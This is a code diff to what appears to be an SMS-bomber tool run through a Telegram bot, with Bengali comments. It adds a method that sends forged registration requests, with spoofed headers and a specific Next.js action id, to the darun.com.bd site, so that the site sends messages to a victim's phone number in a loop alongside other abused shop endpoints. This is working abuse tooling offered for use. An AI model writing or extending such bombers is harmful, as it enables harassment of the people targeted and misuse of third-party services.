@@ -280,6 +280,37 @@ class Bomber:
 # আবারও করলাম 
 
 
+  def darun_bd(self):
+    url = "https://darun.com.bd/register?next=%2F"
+    
+    # Next.js Server Actions এর জন্য নির্দিষ্ট হেডার্স
+    headers = {
+        "Host": "darun.com.bd",
+        "User-Agent": self.getUserAgent(),
+        "Accept": "text/x-component",
+        "Content-Type": "text/plain;charset=UTF-8",
+        "Origin": "https://darun.com.bd",
+        "Referer": "https://darun.com.bd/register?next=%2F",
+        "Next-Action": "402dce7ca6db2006145ef9dc026f141dc180ce851e",
+        "X-Requested-With": "mark.via.gp",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+    }
+
+    # বডি ফরম্যাট অনুযায়ী রেন্ডম নাম এবং ফোন নম্বর দিয়ে পেমেন্ট/পেলোড তৈরি
+    name_list = ["Fosla", "Oustad", "Ruhin", "Hero", "Admin", "User"]
+    rand_name = random.choice(name_list)
+    payload = f'[{{"name":"{rand_name}","phone":"{self.user_mobile}","email":""}}]'
+
+    try:
+      r = requests.post(url, data=payload, headers=headers, timeout=5)
+      # সফলভাবে রিকোয়েস্ট হিট হলে (Next.js অ্যাকশনে সাধারণত 200 বা সমমানের স্ট্যাটাস দেয়)
+      if r.status_code == 200:
+        return True
+    except:
+      pass
+    return False
+
+
 
 
 
@@ -327,6 +358,7 @@ class Bomber:
         self.ghorerbazar,
         self.shopbasebd, #নতুন আসচে 
         self.rkpl_estore, #ওইটাও আসচে নিজে
+        self.darun_bd,
     ]
 
     while counter < self.number_of_messege:
@@ -544,7 +576,7 @@ def handle_text_buttons(message):
     bot.send_message(
         chat_id,
         (
-            "👑 **Developer:**WQ OWNER (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
+            "👑 **Developer:**WQ OWNER e (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
             " **Hosted on:** None"
         ),
         reply_markup=get_reply_keyboard(),
